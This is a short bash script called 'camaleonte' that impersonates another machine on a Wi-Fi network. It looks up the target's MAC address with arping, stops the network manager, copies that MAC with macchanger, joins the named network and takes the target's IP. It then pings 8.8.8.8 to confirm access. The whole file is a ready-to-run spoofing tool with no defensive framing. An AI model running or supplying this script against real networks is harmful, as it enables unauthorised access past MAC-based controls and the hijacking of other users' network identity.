#!/bin/bash
#Usage: camaleonte iface wifi target gateway
#Requires arping of iputils package
if [ $# -lt 3 -o $EUID -ne 0 ]; then 
	echo "[!] Usage: camaleonte iface_name wifi_name target_ip gateway_ip"
	echo "[!] Need to be root ! "
	exit 1
fi
p="$( arping -I $1 -f $3 -w 3 )"

reg="\[(.*)\]"

if [[ $p =~ $reg ]]
then
	echo "${BASH_REMATCH[1]}"
else
	echo "[!] cannot find mac address of target"
	exit 1
fi

mac="${BASH_REMATCH[1]}"
ip=$3
ap=$2
iface=$1

echo "[+] lets spoof $mac,$ip"

service network-manager stop
sleep 1

ifconfig $iface down

macchanger $iface -m $mac
iwconfig $iface essid $ap
ifconfig $iface $ip

echo '[+] tryin to ping google.com ...'
ping 8.8.8.8 -c 4 -w 3
echo '[+] Bless..'
exit 0
